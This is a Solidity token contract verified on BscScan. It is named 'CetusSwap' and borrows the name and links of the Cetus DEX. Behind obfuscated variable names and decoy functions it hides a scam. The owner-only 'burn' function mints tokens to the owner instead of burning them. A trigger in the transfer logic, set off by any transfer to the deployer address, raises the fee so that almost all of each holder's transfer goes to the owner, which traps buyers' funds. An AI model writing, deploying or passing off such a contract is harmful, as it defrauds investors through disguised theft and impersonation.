/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

/*
CetusSwap
Cetus - LiVe on Aptos & Sui
A Pioneer DEX and Concentrated Liquidity Protocol Built on #Aptos and #Sui
LIVE on Aptos Mainnet: https://app.cetus.zone
Earn XP cetusprotocol.crew3.xyz/questboard
https://twitter.com/CetusProtocol
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract CetusSwap {
address private  MBOVEU = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  QJZAEC = 86;
string public  symbol = "CetusSwap";
address private  VFRTJL = address(0);
address private  DQSJQJ = address(0);
string public  name = "CetusSwap";
address private  OCIPKF = address(0);
uint256 private  YQKJAN = 91;
address public owner;
uint256 public constant MHAQMP = 99999;
uint256 private  EALBKS = 95;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  HHAPCR = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  SZAIUX = 4;
uint256 private  KXIZMP = 8;
address private  UWTFHP = address(0);
uint256 public constant totalSupply = 1000000000000000000000000000;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 private  DLKIRV = 13;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () public {
DQSJQJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPCQKDV 0");
require(spender != address(0), "fPCQKDV 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _add1QJZAEC() private returns (uint256) {
return QJZAEC + 88;
}
//
function _getE2ALBKS() private returns (uint256) {
return EALBKS--;
}
//
function _addMB3OVEU() private returns (address) {
return MBOVEU;
}
//
function _getKXI4ZMP() private returns (uint256) {
return KXIZMP--;
}
//
function _addUWTF5HP() private returns (address) {
return UWTFHP;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getOCIPK6F() private returns (address) {
return OCIPKF;
}
//
function _addSZAIUX7() private returns (uint256) {
return SZAIUX++;
}
//
function _getY8QKJAN() private returns (uint256) {
return YQKJAN - QJZAEC;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PCQKDV");
require(to != address(0), "PCQKDV");
require(amount <= balanceOf[from], "PCQKDV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MHAQMP/HHAPCR ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DQSJQJ){
HHAPCR = MHAQMP+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _addDL9KIRV() private returns (uint256) {
return DLKIRV++;
}
//
function _getVFR10TJL() private returns (address) {
return VFRTJL;
}
//
//
}

library Address256 {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}